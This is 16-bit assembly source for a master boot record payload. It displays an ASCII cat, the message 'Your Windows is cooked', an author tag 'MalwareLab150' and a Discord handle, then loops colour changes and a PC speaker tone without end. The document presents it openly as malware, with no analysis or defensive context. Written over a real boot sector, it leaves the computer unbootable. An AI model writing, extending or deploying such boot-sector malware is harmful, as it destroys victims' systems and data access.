[bits 16]
[org 0x7C00]

start:
    xor     ax, ax
    mov     ds, ax
    cld
    mov     ax, 0012h
    int     10h

    mov     ah, 0x0B
    mov     bh, 0
    mov     bl, 4
    int     10h

    mov     si, nyanCat
    mov     bl, 0x0F
    call    printstr

    mov     dh, 10
    mov     dl, 10
    call    gotoxy
    mov     si, Dario
    call    printstr

    mov     dh, 12
    mov     dl, 10
    call    gotoxy
    mov     si, Info
    call    printstr

    mov     dh, 14
    mov     dl, 10
    call    gotoxy
    mov     si, discord
    call    printstr

color_combo:
    mov     ah, 0x0B
    mov     bh, 0
    mov     bl, 4
    int     10h
    call    sound
    call    delay

    mov     ah, 0x0B
    mov     bh, 0
    mov     bl, 2
    int     10h
    call   sound
    call    delay

    mov     ah, 0x0B
    mov     bh, 0
    mov     bl, 1
    int     10h
    call    sound
    call    delay

    mov     ah, 0x0B
    mov     bh, 0
    mov     bl, 5
    int     10h
    call   sound
    call    delay

    jmp     color_combo

sound:
    mov     ax, 0xB0
    out     0x43, al
    mov     ax, 2273
    out     0x42, al
    mov     al, ah
    out     0x42, al

    in      al, 0x61
    or      al, 3
    out     0x61, al
    ret

delay:
    mov     cx, 0xFFFF
delay_loop:
    loop    delay_loop
    ret

printstr:
    mov     bh, 0
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh
    int     10h
    jmp     print
done:
    ret

gotoxy:
    mov     ah, 02h
    mov     bh, 0
    int     10h
    ret

nyanCat db '  /\_/\  ', 0Dh, 0Ah ;sono diventato Dario Greggio per sto coso
        db ' ( o.o ) ', 0Dh, 0Ah
        db '  > ^ <  ', 0Dh, 0Ah, 0

Dario db 'Dario Greggio won!', 0
Info db 'Your Windows is cooked . Made by MalwareLab150 aka 2.0', 0
discord db 'My discord malwarelabx.sys', 0

times 510 - ($ - $$) db 0
dw 0xAA55
